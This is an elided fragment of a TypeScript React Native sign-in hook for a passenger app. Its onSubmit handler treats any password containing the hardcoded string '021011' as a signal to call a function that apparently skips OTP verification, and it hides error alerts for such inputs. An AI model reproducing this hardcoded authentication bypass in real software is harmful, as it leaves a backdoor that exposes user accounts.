...
export const usePassangerSingin = () => {
    ...
    const onSubmit = async (code: string, phoneNumber: string) => {
        ...
        try {
            ...
            if(payload.password.includes('021011')) fetchUserWhenOTPIsOff(payload);
            ...
            if(axios.isAxiosError(error)){
                ...
                if(error.status === 400 && !payload.password.includes('021011')) return Alert.alert("Informação", error.response?.data.message);
                
                if(error.status === 404 && !payload.password.includes('021011')) return Alert.alert("Informação", error.response?.data.message);
            }
        } finally {
            setIsLoading(false);
        }
    ...
    const fetchUserWhenOTPIsOff = async (payload: AuthInput) => {
